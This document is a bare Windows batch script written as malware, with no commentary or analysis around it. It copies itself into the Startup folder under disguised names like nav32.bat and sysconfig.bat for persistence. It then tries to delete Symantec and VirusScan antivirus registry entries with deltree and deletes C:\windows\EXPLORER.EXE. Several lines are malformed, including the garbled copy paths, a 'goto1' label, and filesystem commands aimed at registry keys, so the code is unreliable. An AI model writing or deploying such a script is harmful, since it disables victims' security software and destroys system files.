   @echo off


   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Antidis.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\nav32.bat"
   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\antidis.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat"

   if exist HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSExchangeIS\VirusScan goto 2
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\InstalledApps goto 1
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\LiveSubscribe goto 1
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Norton AntiVirus goto 1
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\ScriptBlocking goto 1
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Shared Technology goto 1
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\SharedDefs goto1
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\SharedUsage goto1
   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symevent goto 1


   :1
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\InstalledApps
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\LiveSubscribe
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Norton AntiVirus
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\ScriptBlocking
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Shared Technology
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\SharedDefs
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\SharedUsage
   deltree /y *.* HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symevent
   goto 3

   :2
   deltree /y *.* HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSExchangeIS\VirusScan
   goto 3

   :3
   ATTRIB C:\windows\EXPLORER.EXE -H -A -R
   DEL C:\windows\EXPLORER.EXE
   cls
   :end
